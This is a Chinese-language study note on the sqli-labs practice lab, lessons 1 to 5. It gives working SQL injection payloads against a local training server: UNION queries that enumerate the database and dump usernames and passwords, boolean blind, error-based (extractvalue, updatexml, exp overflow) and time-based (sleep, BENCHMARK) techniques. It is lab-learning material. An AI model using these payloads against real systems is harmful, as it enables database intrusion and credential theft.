###
sqli-labs 学习笔记

##
lession-1  GET-Error based-single quotes String

我们可以在http://127.0.0.1/sqllib/Less-5/?id=1后面直接添加一个 '
我们可以看到提交到sql中的1'在经过sql语句构造后形成 '1'' LIMIT 0,1，多加了一个 ' 。这种方式就是从错误信息中得到我们所需要的信息，那我们接下来想如何将多余的 ' 去掉呢
尝试 'or 1=1--+
此时构造的sql语句就成了
Select ****** where id='1'or 1=1--+' LIMIT 0,1

最后从源代码中分析下为什么会造成注入？
Sql语句为sql="SELECT∗FROMusersWHEREid=′id' LIMIT 0,1";
Id参数在拼接sql语句时，未对id进行任何的过滤等操作，所以当提交 'or 1=1--+，直接构造的sql语句就是
SELECT * FROM users WHERE id='1'or 1=1--+ LIMIT 0,1
这条语句因or 1=1 所以为永恒真。

union联合注入，union的作用是将两个sql语句进行联合。Union可以从下面的例子中可以看出，强调一点：union前后的两个sql语句的选择列数要相同才可以。Union all与union 的区别是增加了去重的功能。我们这里根据上述background的知识，进行information_schema 知识的应用。
http://127.0.0.1/sqllib/Less-1/?id=-1'union select 1,2--+
当id的数据在数据库中不存在时，（此时我们可以id=-1，两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来）此处前台页面返回了我们构造的union 的数据。

爆数据库
http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata--+
此时的sql语句为SELECT * FROM users WHERE id='-1'union select 1,group_concat(schema_name),3 from information_schema.schemata--+ LIMIT 0,1

爆security数据库的数据表
http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27--+
此时的sql语句为SELECT * FROM users WHERE id='-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+ LIMIT 0,1

爆users表的列
http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27users%27--+
此时的sql语句为SELECT * FROM users WHERE id='-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+ LIMIT 0,1

爆数据
http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,username,password%20from%20users%20where%20id=2--+
此时的sql语句为SELECT * FROM users WHERE id='-1'union select 1,username,password from users where id=2--+ LIMIT 0,1

##
lession-2  GET-Error based-Intiger based

我们又得到了一个Mysql返回的错误，提示我们语法错误。
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1′ at line 1
现在执行的查询语句如下：
Select * from TABLE where id = 1' ;
所以这里的奇数个单引号破坏了查询，导致抛出错误。
因此我们得出的结果是，查询代码使用了整数。
Select * from TABLE where id = (some integer value);
现在，从开发者的视角来看，为了对这样的错误采取保护措施，我们可以注释掉剩余的查询：
http://localhost/sqli-labs/Less-2/?id=1–-+

源代码中可以分析到SQL语句为下：
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
对id没有经过处理

可以成功注入的有：
or 1=1
or 1=1 --+
其余的payload与less1中一直，只需要将less1中的 ' 去掉即可。

##
lession-3  GET-Error based-single quotes with twist

我们使用?id='注入代码后，我们得到像这样的一个错误：
MySQL server version for the right syntax to use near "") LIMIT 0,1′ at line 1

这里它意味着，开发者使用的查询是：
Select login_name, select password from table where id= ('our input here')
所以我们再用这样的代码来进行注入：
?id=1′) –-+

可以成功注入的有：
') or '1'=('1'
) or 1=1 --+
其余的payload与less1中一直，只需要将less1中的 ' 添加） 即')

##
lession-4  GET-Error based-double quotes

我们使用?id=1"
注入代码后，我们得到像这样的一个错误：
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1
这里它意味着，代码当中对id参数进行了 "" 和 () 的包装。

所以我们再用这样的代码来进行注入：
?id=1") –-+

其余的payload与less1中一直，只需要将less1中的 ' 更换为 ") 。

##
lession 5 double injection 盲注

1.利用left(database(),1)进行尝试

http://127.0.0.1/sqllib/Less-5/?id=1%27and%20left(version(),1)=5%23
查看一下version()，数据库的版本号为5.6.17，这里的语句的意思是看版本号的第一位是不是5，明显的返回的结果是正确的。

接下来看一下数据库的长度
http://127.0.0.1/sqllib/Less-5/?id=1%27and%20length(database())=8%23
长度为8时，返回正确结果，说明长度为8.

猜测数据库第一位
http://127.0.0.1/sqllib/Less-5/?id=1%27and%20left(database(),1)%3E%27a%27--+
Database()为security，所以我们看他的第一位是否 > a,很明显的是s > a,因此返回正确。当我们不知情的情况下，可以用二分法来提高注入的效率。

猜测数据库第二位
得知第一位为s，我们看前两位是否大于 sa
http://127.0.0.1/sqllib/Less-5/?id=1%27and%20left(database(),2)%3E%27sa%27--+

2.利用substr() ascii()函数进行尝试
ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101

根据以上得知数据库名为security，那我们利用此方式获取security数据库下的表。
获取security数据库的第一个表的第一个字符
http://127.0.0.1/sqllib/Less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))%3E80--+
Ps：此处table_schema可以写成 ='security'，但是我们这里使用的database()，是因为此处database()就是security。此处同样的使用二分法进行测试，直到测试正确为止。
此处应该是101，因为第一个表示email。

如何获取第一个表的第二位字符呢？
这里我们已经了解了substr()函数，这里使用substr(**,2,1)即可。

那如何获取第二个表呢?
这里可以看到我们上述的语句中使用的limit 0,1. 意思就是从第0个开始，获取第一个。那要获取第二个是不是就是limit 1,1！

此处113返回是正确的，因为第二个表示referers表，所以第一位就是r.
以后的过程就是不断的重复上面的，这里就不重复造轮子了。原理已经解释清楚了。
当你按照方法运行结束后，就可以获取到所有的表的名字。

3.利用regexp获取（2）中users表中的列
http://127.0.0.1/sqllib/Less-5/?id=1%27%20and%201=(select%201%20from%20information_schema.columns%20where%20table_name=%27users%27%20and%20table_name%20regexp%20%27^us[a-z]%27%20limit%200,1)--+

上述语句时选择users表中的列名是否有us**的列
http://127.0.0.1/sqllib/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)--+
上图中可以看到username存在。我们可以将username换成password等其他的项也是正确的。

4.利用ord（）和mid（）函数获取users表的内容
http://127.0.0.1/sqllib/Less-5/?id=1%27%20and%20ORD(MID((SELECT%20IFNULL(CAST(username%20AS%20CHAR),0x20)FROM%20security.users%20ORDER%20BY%20id%20LIMIT%200,1),1,1))=68--+
获取users表中的内容。获取username中的第一行的第一个字符的ascii，与68进行比较，即为D。而我们从表中得知第一行的数据为Dumb。所以接下来只需要重复造轮子即可。

总结：以上（1）（2）（3）（4）我们通过使用不同的语句，将通过布尔盲注SQL的所有的payload进行演示了一次。想必通过实例更能够对sql布尔盲注语句熟悉和理解了。

接下来，我们演示一下报错注入和延时注入。

5.首先使用报错注入
http://127.0.0.1/sqllib/Less-5/?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+

利用double数值类型超出范围进行报错注入
http://127.0.0.1/sqllib/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+

利用bigint溢出进行报错注入
http://127.0.0.1/sqllib/Less-5/?id=1' union select (!(select * from (select user())x) - ~0),2,3--+

xpath函数报错注入
http://127.0.0.1/sqllib/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+
http://127.0.0.1/sqllib/Less-5/?id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+

利用数据的重复性
http://127.0.0.1/sqllib/Less-5/?id=1'union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+

6.延时注入
利用sleep()函数进行注入
http://127.0.0.1/sqllib/Less-5/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+
当错误的时候会有5秒的时间延时。

利用BENCHMARK()进行延时注入
http://127.0.0.1/sqllib/Less-5/?id=1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1--+
当结果正确的时候，运行ENCODE('MSG','by 5 seconds')操作50000000次，会占用一段时间。

至此，我们已经将上述讲到的盲注的利用方法全部在less5中演示了一次。在后续的关卡中，将会挑一种进行演示，其他的盲注方法请参考less5.

